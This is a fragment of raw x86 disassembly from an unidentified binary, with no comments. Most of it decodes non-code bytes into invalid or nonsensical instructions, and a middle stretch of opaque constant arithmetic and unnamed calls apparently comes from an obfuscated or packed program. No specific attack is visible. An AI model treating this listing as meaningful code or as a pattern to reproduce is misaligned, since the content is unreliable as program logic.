  40f8db:	xor    ah,BYTE PTR [edi+0x43fce68b]
  40f8e1:	or     DWORD PTR [edx],0xffffffde
  40f8e4:	fcomip st,st(1)
  40f8e6:	pop    edi
  40f8e7:	adc    edi,ecx
  40f8e9:	jg     0x40f877
  40f8eb:	push   esi
  40f8ec:	jne    0x40f87e
  40f8ee:	dec    edi
  40f8ef:	or     DWORD PTR [esi-0x1c],edi
  40f8f2:	aad    0xf1
  40f8f4:	cdq    
  40f8f5:	lods   al,BYTE PTR ds:[esi]
  40f8f6:	pop    edx
  40f8f7:	or     cl,bh
  40f8f9:	add    eax,0xcf127372
  40f8fe:	mov    ebp,0x84cdd2ec
  40f903:	mov    WORD PTR [edx-0x2ebb1be4],?
  40f909:	sbb    ecx,DWORD PTR [ebp-0xcfaa311]
  40f90f:	sar    ah,0x3b
  40f912:	test   al,0x5
  40f914:	xchg   esi,eax
  40f915:	push   ss
  40f916:	lock xchg esp,eax
  40f918:	cmp    eax,0x9d2fd4f4
  40f91d:	jle    0x40f8ac
  40f91f:	sub    BYTE PTR [esi-0x23],ah
  40f922:	mov    DWORD PTR [ecx+0x69],edx
  40f925:	out    0xea,eax
  40f927:	inc    eax
  40f928:	inc    esp
  40f929:	pop    edi
  40f92a:	sub    eax,0x36d71e3f
  40f92f:	call   0xb0ef4afb
  40f934:	ins    DWORD PTR es:[edi],dx
  40f935:	call   0x964776d3
  40f93a:	cs test esp,edx
  40f93d:	rdmsr  
  40f93f:	ficom  WORD PTR [ebp+eax*2-0x292e1b73]
  40f946:	sub    ch,dl
  40f948:	mov    dh,0xaa
  40f94a:	inc    ebx
  40f94b:	out    dx,eax
  40f94c:	jnp    0x40f9a1
  40f94e:	mov    eax,0x4d8c65b7
  40f953:	add    dh,BYTE PTR [edx+0x242c7198]
  40f959:	sub    BYTE PTR [esp+ebp*1-0x19],al
  40f95d:	dec    eax
  40f95e:	cmp    edx,DWORD PTR [edi-0x1a]
  40f961:	push   ebx
  40f962:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40f964:	pushf  
  40f965:	mov    ebp,0x321c09b0
  40f96a:	or     ch,BYTE PTR [edi-0x4a]
  40f96d:	cdq    
  40f96e:	retf   
  40f96f:	into   
  40f970:	(bad)  
  40f971:	arpl   WORD PTR [esi],bx
  40f973:	or     al,0xeb
  40f975:	and    ch,BYTE PTR [eax-0x8041b3c]
  40f97b:	push   ebp
  40f97c:	mov    esp,0x8a93381e
  40f981:	push   ebp
  40f982:	ja     0x40f966
  40f984:	cmp    DWORD PTR [ebp-0x4521e479],0xb56a07c7
  40f98e:	ins    BYTE PTR es:[edi],dx
  40f98f:	jae    0x40f911
  40f991:	mov    al,0x4e
  40f993:	bound  ebx,QWORD PTR [ebp-0x3b]
  40f996:	sbb    ebp,DWORD PTR [edi]
  40f998:	xor    BYTE PTR [ebp-0x19],0x51
  40f99c:	inc    edi
  40f99d:	jecxz  0x40f95f
  40f99f:	add    BYTE PTR [ebx-0x30],bh
  40f9a2:	(bad)  
  40f9a4:	pop    esp
  40f9a5:	add    DWORD PTR [edi],esp
  40f9a7:	sbb    eax,0x3bbd741c
  40f9ac:	retf   0x2890
  40f9af:	les    edi,FWORD PTR [esi-0x1a]
  40f9b2:	popa   
  40f9b3:	push   ecx
  40f9b4:	push   esi
  40f9b5:	stos   DWORD PTR es:[edi],eax
  40f9b6:	iret   
  40f9b7:	push   edi
  40f9b8:	rol    DWORD PTR [ebp+esi*8+0x54],0x2f
  40f9bd:	(bad)  
  40f9be:	lock sahf 
  40f9c0:	add    ch,BYTE PTR [edi+0x8f38a7e]
  40f9c6:	jl     0x40f9ba
  40f9c8:	rcr    edi,cl
  40f9ca:	mov    bh,0x15
  40f9cc:	mov    edi,0x35f2ab53
  40f9d1:	xlat   BYTE PTR ds:[ebx]
  40f9d2:	(bad)  
  40f9d4:	sub    al,0xf3
  40f9d6:	mov    ecx,0xf241ce17
  40f9db:	inc    ecx
  40f9dc:	retf   0x93
  40f9df:	fs aad 0x45
  40f9e2:	sub    eax,ecx
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x4220c5
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x5b166170]
  40fc87:	jo     0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0x5e181814
  40fc91:	loop   0x40fcb8
  40fc93:	outs   dx,DWORD PTR cs:[esi]
  40fc95:	fwait
  40fc96:	int    0xe6
  40fc98:	leave  
  40fc99:	push   ds
  40fc9a:	dec    edi
  40fc9b:	mov    al,BYTE PTR [ecx-0x7152547]
  40fca1:	sbb    esp,DWORD PTR [ebx-0x77a5defd]
  40fca7:	push   0xffffff86
  40fca9:	sub    al,0x63
  40fcab:	in     al,dx
  40fcac:	stos   BYTE PTR es:[edi],al
  40fcad:	jmp    0x6361efc1
  40fcb2:	mov    ch,0x93
  40fcb4:	call   0x7a680af7
  40fcb9:	retf   0x92d
  40fcbc:	add    DWORD PTR ds:0xcba56a6d,edx
  40fcc2:	fxch   st(1)
  40fcc4:	dec    esp
  40fcc5:	fst    QWORD PTR [edx+ecx*8-0x18231258]
  40fccc:	inc    ecx
  40fccd:	jecxz  0x40fcae
  40fccf:	dec    eax
  40fcd0:	aas    
  40fcd1:	clc    
  40fcd2:	cmc    
  40fcd3:	(bad)  
  40fcd4:	push   ecx
  40fcd5:	mov    ebp,0x82ca87a7
  40fcda:	cs pop ebx
  40fcdc:	and    bh,0x9
  40fcdf:	push   edx
  40fce0:	retf   0x627f
  40fce3:	add    DWORD PTR [esp+ecx*2],ebp
  40fce6:	rcl    BYTE PTR [ebx-0x38],0x9e
  40fcea:	push   edi
  40fceb:	or     DWORD PTR [edi],eax
  40fced:	push   0x8e005937
  40fcf2:	cmp    DWORD PTR [ecx],ebp
  40fcf4:	jl     0x40fcb9
  40fcf6:	shl    DWORD PTR [edi-0x83f29f4],0xe8
  40fcfd:	fyl2x  
  40fcff:	aas    
  40fd00:	jno    0x40fcca
  40fd02:	mov    cl,0xc7
  40fd04:	jae    0x40fd6f
  40fd06:	(bad)  
  40fd07:	and    cl,bh
  40fd09:	sbb    bl,BYTE PTR [ebp+0x46204d1]
  40fd0f:	or     bh,BYTE PTR [edx]
  40fd11:	or     BYTE PTR ds:0x3a03b7ef,ch
  40fd17:	push   ecx
  40fd18:	icebp  
  40fd19:	(bad)  
  40fd1b:	cmp    al,0xa
  40fd1d:	push   0xe17f3b9a
  40fd22:	in     al,0x57
  40fd24:	cwde   
  40fd25:	fst    DWORD PTR [edx]
  40fd27:	cli    
  40fd28:	sbb    DWORD PTR [ebx],ecx
  40fd2a:	xor    BYTE PTR ds:0x31023c80,0x3c
  40fd31:	sbb    al,BYTE PTR [eax]
  40fd33:	xor    ecx,0x8ded474
  40fd39:	xor    al,0xc2
  40fd3b:	les    edx,FWORD PTR [edx-0x602e2440]
  40fd41:	jbe    0x40fd02
  40fd43:	jge    0x40fd50
  40fd45:	aas    
  40fd46:	push   ebx
  40fd47:	push   es
  40fd48:	jns    0x40fd15
  40fd4a:	mov    dl,0xa6
  40fd4c:	mov    edx,0x57faa56f
  40fd51:	test   eax,0x7bf52bcd
  40fd56:	mov    bl,0xcb
  40fd58:	push   ebx
  40fd59:	retf   0x6767
  40fd5c:	pop    edi
  40fd5d:	popf   
  40fd5e:	mov    ds:0xbe3b984a,al
  40fd63:	mov    eax,DWORD PTR [esi-0x19]
  40fd66:	mul    BYTE PTR fs:[esi-0x13]
  40fd6a:	arpl   WORD PTR [ecx-0x217d6938],ax
  40fd70:	push   ebx
  40fd71:	int    0x54
  40fd73:	inc    ebp
  40fd74:	or     BYTE PTR [esi+0x65],dh
  40fd77:	sbb    BYTE PTR [eax-0x64],0x50
  40fd7b:	stos   BYTE PTR es:[edi],al
  40fd7c:	(bad)  
  40fd7d:	jnp    0x40fd82
  40fd7f:	and    bh,ch
  40fd81:	test   al,0x69
  40fd83:	add    eax,0x1331fc2e
  40fd88:	jmp    0x35a:0xcea89151
  40fd8f:	pop    ebp
  40fd90:	shl    BYTE PTR [edi-0x62aa26c4],1
  40fd96:	das    
  40fd97:	std    
  40fd98:	mov    edi,0xf3b3fc5e
  40fd9d:	adc    cl,dl
  40fd9f:	xchg   esi,eax
  40fda0:	shl    DWORD PTR [ebx],cl
  40fda2:	inc    esi
  40fda3:	div    BYTE PTR [edi-0x1a38a9b]
  40fda9:	mov    cl,0x41
  40fdab:	mov    al,0xa8
  40fdad:	sub    eax,0xc2110989
  40fdb2:	stos   DWORD PTR es:[edi],eax
  40fdb3:	les    eax,FWORD PTR [ebp+0x304e048c]
  40fdb9:	pushf  
  40fdba:	out    0xd9,al
  40fdbc:	ins    DWORD PTR es:[edi],dx
  40fdbd:	mov    ebx,?
  40fdbf:	xchg   ebx,eax
  40fdc0:	sub    eax,0x3eb76c3d
  40fdc5:	jecxz  0x40fdee
  40fdc7:	adc    esi,ecx
  40fdc9:	cmp    BYTE PTR [ecx-0x59493180],ch
  40fdcf:	add    edi,DWORD PTR [ebp+0x70443e54]
  40fdd5:	std    
  40fdd6:	sub    al,0x55
  40fdd8:	xchg   esp,eax
  40fdd9:	scas   eax,DWORD PTR es:[edi]
  40fdda:	xlat   BYTE PTR ds:[ebx]
  40fddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fddc:	iret   
  40fddd:	mov    ecx,0xbbd75a05
  40fde2:	iret   
  40fde3:	mov    ds:0x81b7a183,al
  40fde8:	rcl    dl,0x89
  40fdeb:	jecxz  0x40fdf8
  40fded:	sbb    eax,DWORD PTR [edi-0x2]
  40fdf0:	repnz cld 
  40fdf2:	sar    bh,1
  40fdf4:	and    eax,0x77b248c5
  40fdf9:	clc    
  40fdfa:	inc    ebx
  40fdfb:	push   ebx
  40fdfc:	nop
  40fdfd:	fisttp WORD PTR [ebx+0x4b236b2]
  40fe03:	sub    eax,0xbb0bfebc
  40fe08:	cwde   
  40fe09:	aad    0xf8
  40fe0b:	dec    esp
  40fe0c:	iret   
  40fe0d:	jns    0x40fd91
  40fe0f:	xchg   esp,eax
  40fe10:	sbb    dh,BYTE PTR [edi]
  40fe12:	nop
  40fe13:	push   esp
  40fe14:	rcl    BYTE PTR [eax+edx*2],cl
  40fe17:	mov    al,ds:0x95d686ae
  40fe1c:	in     eax,dx
  40fe1d:	(bad)  
  40fe1e:	adc    dh,BYTE PTR [eax-0x2fa0a76a]
  40fe24:	pop    ecx
  40fe25:	mov    esp,0xadf922bf
  40fe2a:	lea    esi,[edx]
  40fe2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe2d:	inc    eax
  40fe2e:	outs   dx,DWORD PTR ds:[esi]
  40fe2f:	cmp    eax,0xa718981b
  40fe34:	lods   al,BYTE PTR ds:[esi]
  40fe35:	fstp   QWORD PTR [ecx+ecx*1]
  40fe38:	mov    eax,ds:0xf4a51b4a
  40fe3d:	and    BYTE PTR [ebp-0x39],0x6f
  40fe41:	dec    ecx
  40fe42:	out    dx,eax
  40fe43:	push   edx
  40fe44:	sbb    bl,dl
  40fe46:	ins    BYTE PTR es:[edi],dx
  40fe47:	push   0xffffffa3
  40fe49:	or     eax,0x8c6fe94c
  40fe4e:	(bad)  
  40fe4f:	stc    
  40fe50:	sub    al,0xa3
  40fe52:	dec    ebp
  40fe53:	pop    es
  40fe54:	enter  0xbf3,0xad
  40fe58:	add    BYTE PTR [eax+ecx*8],dh
  40fe5b:	sub    edx,DWORD PTR [esi-0x75]
  40fe5e:	lds    eax,FWORD PTR [edx+0x792be6fc]
  40fe64:	inc    ebx
  40fe65:	dec    ecx
  40fe66:	dec    ebp
  40fe67:	outs   dx,BYTE PTR ds:[esi]
  40fe68:	cwde   
  40fe69:	push   ebx
  40fe6a:	pop    edx
  40fe6b:	jns    0x40fee8
  40fe6d:	and    eax,0x8a1da1c5
  40fe72:	cmp    ecx,ebx
  40fe74:	stos   BYTE PTR es:[edi],al
  40fe75:	icebp  
  40fe76:	cmp    dh,BYTE PTR [eax]
  40fe78:	fnsave [esi-0x3b144be2]
  40fe7e:	scas   al,BYTE PTR es:[edi]
  40fe7f:	inc    esp
  40fe80:	ins    BYTE PTR es:[edi],dx
  40fe81:	pop    edi
  40fe82:	add    eax,0x73325063
  40fe87:	inc    ecx
  40fe88:	adc    al,0xe8
  40fe8a:	inc    eax
  40fe8b:	pop    ss
  40fe8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8d:	iret   
  40fe8e:	inc    ecx
  40fe8f:	fwait
  40fe90:	repnz icebp 
  40fe92:	xchg   DWORD PTR [esi],esp
  40fe94:	inc    edi
  40fe95:	outs   dx,DWORD PTR ds:[esi]
  40fe96:	test   BYTE PTR [edx+eiz*1-0x235ceba7],ch
  40fe9d:	loope  0x40fea9
  40fe9f:	push   ecx
  40fea0:	aas    
  40fea1:	or     ch,BYTE PTR ds:0x1693e8a2
  40fea7:	cmp    esp,DWORD PTR [esi-0x5c]
  40feaa:	(bad)  
  40feac:	sbb    BYTE PTR [edi-0x77c5f709],0xb9
  40feb3:	mov    esi,0x77399fdc
  40feb8:	(bad)  
  40feb9:	call   0xd02bd780
  40febe:	push   ecx
  40febf:	inc    edi
  40fec0:	push   ds
  40fec1:	loop   0x40feb3
  40fec3:	in     eax,0x11
  40fec5:	push   esp
  40fec6:	(bad)  
  40fec7:	dec    esi
  40fec8:	jecxz  0x40ff0b
  40feca:	lahf   
  40fecb:	cli    
  40fecc:	push   cs
  40fecd:	int    0xfe
  40fecf:	inc    esp
  40fed0:	retf   
  40fed1:	pop    esp
  40fed2:	ficomp WORD PTR ds:0xff924408
  40fed8:	add    al,0x24
  40feda:	retf   
  40fedb:	sbb    eax,0x260c2a92
  40fee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fee1:	xchg   ecx,eax
  40fee2:	mov    esp,0xbf63207f
  40fee7:	adc    ebp,eax
  40fee9:	aas    
  40feea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feeb:	inc    eax
  40feec:	xchg   BYTE PTR [edx+edx*4+0x36],ch
  40fef0:	pop    ds
  40fef1:	shl    esp,0x6
  40fef4:	and    esp,DWORD PTR [ecx+edx*1+0x62493ec3]
  40fefb:	(bad)  
  40fefc:	leave  
  40fefd:	pop    ds
  40fefe:	push   esi
  40feff:	sub    esi,ecx
  40ff01:	nop
  40ff02:	in     eax,0x3e
  40ff04:	jmp    0xe61be556
  40ff09:	sub    al,dh
  40ff0b:	add    al,0x30
  40ff0d:	push   0x43b78f18
  40ff12:	shl    DWORD PTR [edi],cl
  40ff14:	fcmovbe st,st(2)
  40ff16:	inc    ebp
  40ff17:	loope  0x40ff23
  40ff19:	test   eax,0x82ccf739
  40ff1e:	xchg   esi,eax
  40ff1f:	loopne 0x40ff20
  40ff21:	or     dh,BYTE PTR [ebp+0x32]
  40ff24:	(bad)
  40ff28:	mov    eax,0xd2342e4d
  40ff2d:	ficomp WORD PTR [ebp+0x719354bc]
  40ff33:	xchg   ebx,eax
  40ff34:	adc    al,0xa1
  40ff36:	inc    ecx
  40ff37:	sub    ah,BYTE PTR [edx-0x332cfcb]
  40ff3d:	pop    ecx
  40ff3e:	loopne 0x40ff0d
  40ff40:	fiadd  DWORD PTR ds:0x3901
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1-0xf838c47]
  40ff68:	add    al,0x41
  40ff6a:	mov    esi,0x1818981d
  40ff6f:	mov    esi,0x20181814
  40ff74:	lods   al,BYTE PTR ds:[esi]
  40ff75:	lods   al,BYTE PTR ds:[esi]
  40ff76:	imul   BYTE PTR [esi+0x79]
  40ff79:	adc    dl,BYTE PTR [esi-0x6238581]
  40ff7f:	cli    
  40ff80:	xor    eax,0x4bc08eff
  40ff85:	add    al,0x3a
  40ff87:	lea    ebp,[esi]
  40ff89:	nop
  40ff8a:	mov    edi,0xa769b82f
  40ff8f:	cld    
  40ff90:	enter  0xd723,0xc5
  40ff94:	jg     0x40ffef
  40ff96:	dec    edi
  40ff97:	lods   eax,DWORD PTR ds:[esi]
  40ff98:	daa    
  40ff99:	jnp    0x40fffe
  40ff9b:	les    esi,FWORD PTR [ebp+0x7561feee]
  40ffa1:	outs   dx,BYTE PTR ds:[esi]
  40ffa2:	pop    ss
  40ffa3:	mov    ah,0x46
  40ffa5:	jmp    FWORD PTR [ecx-0x12]
  40ffa8:	sub    BYTE PTR [ecx],0x7a
  40ffab:	popf   
  40ffac:	add    eax,0x5cb42f80
  40ffb1:	fdivr  DWORD PTR [ebx-0x48]
  40ffb4:	dec    eax
  40ffb5:	mov    ?,edx
  40ffb7:	and    cl,bh
  40ffb9:	les    esp,FWORD PTR [esi-0x47]
  40ffbc:	mov    BYTE PTR [ebp+0x5f45558],ah
  40ffc2:	adc    ch,bh
  40ffc4:	div    BYTE PTR [ecx+0x36]
  40ffc7:	xchg   esi,eax
  40ffc8:	sar    BYTE PTR [edi-0x5e6a8a01],1
  40ffce:	xlat   BYTE PTR ds:[ebx]
  40ffcf:	dec    ebx
  40ffd0:	retf   
  40ffd1:	test   al,0x29
  40ffd3:	inc    edi
  40ffd4:	mov    bh,0x93
  40ffd6:	adc    BYTE PTR [ebx],0x6a
  40ffd9:	ret    
  40ffda:	sub    DWORD PTR [ecx+0x16b9381f],edx
  40ffe0:	test   eax,0xbc87afc0
  40ffe5:	jo     0x40ff99
  40ffe7:	ret    
  40ffe8:	mov    ebx,0x7fb30b2c
  40ffed:	sub    eax,0x2f33ae21
  40fff2:	lea    eax,[ebx]
  40fff4:	mov    ds:0xdb555337,eax
  40fff9:	pusha  
  40fffa:	xlat   BYTE PTR ds:[ebx]
  40fffb:	sub    eax,0x4f3ebcd6
  410000:	or     dl,BYTE PTR [esi]
  410002:	test   DWORD PTR [eax+0x1fe1fc86],edx
  410008:	add    bh,ah
  41000a:	aaa    
  41000b:	mov    BYTE PTR [edi-0x3a527e21],dl
  410011:	div    eax
  410013:	and    BYTE PTR [ecx],dl
  410015:	sbb    BYTE PTR [ebp-0x5e8facbf],bh
  41001b:	mov    eax,0xc68488b9
  410020:	(bad)  
  410021:	cli    
  410022:	jge    0x41003d
  410024:	sahf   
  410025:	das    
  410026:	jp     0x40ffe5
  410028:	enter  0xa34c,0xa3
  41002c:	cmp    ebp,ecx
  41002e:	jge    0x410076
  410030:	ja     0x41001a
  410032:	jno    0x41003e
  410034:	mov    esp,0x4eb13d83
  410039:	xchg   DWORD PTR [ecx],esp
  41003b:	jmp    edi
  41003d:	ret    0xb790
  410040:	jb     0x40ffe5
  410042:	mov    ecx,0x43f8c3c3
  410047:	xchg   edi,eax
  410048:	popf   
  410049:	pop    ss
  41004a:	stos   BYTE PTR es:[edi],al
  41004b:	jp     0x41001d
  41004d:	cmp    edx,DWORD PTR [eax]
  41004f:	mov    edx,0x4c266e3
  410054:	arpl   WORD PTR [edi],bp
  410056:	std    
  410057:	and    dl,BYTE PTR [edi-0x59aa4357]
  41005d:	xchg   edx,eax
  41005e:	adc    DWORD PTR [ecx+0x31134b98],edx
  410064:	jmp    0x41009b
  410066:	jbe    0x4100d9
  410068:	push   ecx
  410069:	ins    DWORD PTR es:[edi],dx
  41006a:	jae    0x41001d
  41006c:	xchg   ebx,eax
  41006d:	out    0x42,eax
  41006f:	dec    esp
  410070:	rcl    BYTE PTR ds:0x13b5279a,0xc6
  410077:	data16 mov ?,WORD PTR [edx+0x9]
  41007b:	ja     0x4100e5
  41007d:	jno    0x41004a
  41007f:	fldlg2 
  410081:	scas   eax,DWORD PTR es:[edi]
  410082:	out    0x93,eax
  410084:	rol    DWORD PTR [edx-0x6e],0x45
  410088:	loopne 0x41003d
  41008a:	mov    ds:0x86ab38ad,al
  41008f:	xchg   edi,eax
  410090:	jmp    0x4100f2
  410092:	mov    esp,0x1294d75a
  410097:	loope  0x410036
  410099:	inc    ebx
  41009a:	sbb    DWORD PTR [eax-0x1a057071],edi
  4100a0:	inc    edx
  4100a1:	aas    
  4100a2:	mov    ecx,0x2fe1b440
  4100a7:	test   bl,cl
  4100a9:	jp     0x4100b7
  4100ab:	adc    dh,BYTE PTR [esi+0x5e208fd2]
  4100b1:	es (bad) 
  4100b3:	call   0x9cc8:0xb7ff2e3
  4100ba:	xor    eax,0x7268b498
  4100bf:	fcmovnbe st,st(7)
  4100c1:	sub    BYTE PTR [ecx-0x6af35ee2],ch
  4100c7:	retf   
  4100c8:	xor    DWORD PTR [ebx],edx
  4100ca:	lock mov al,ds:0xf56b9c0b
  4100d0:	pop    sp
  4100d2:	add    eax,0xb5bfa141
  4100d7:	cwde   
  4100d8:	adc    DWORD PTR [eax-0x6c4f350],ecx
  4100de:	or     esi,edx
  4100e0:	js     0x4100ac
  4100e2:	(bad)  
  4100e3:	sbb    eax,0x5af5d593
  4100e8:	fstp   QWORD PTR [edi]
  4100ea:	xor    ecx,DWORD PTR [edx+0x70]
  4100ed:	imul   ebx,esi,0xa3fd6067
  4100f3:	retf   
  4100f4:	pop    ebx
  4100f5:	jg     0x41009c
  4100f7:	dec    edx
  4100f8:	es je  0x4100bf
  4100fb:	retf   0xabd4
  4100fe:	sub    DWORD PTR [edx+0x62],ebx
  410101:	jae    0x410138
  410103:	hlt    
  410104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410105:	cwde   
  410106:	jnp    0x410157
  410108:	mov    bh,0x9f
  41010a:	fs dec edx
  41010c:	test   al,0xd3
  41010e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41010f:	mov    al,0x46
  410111:	pop    esp
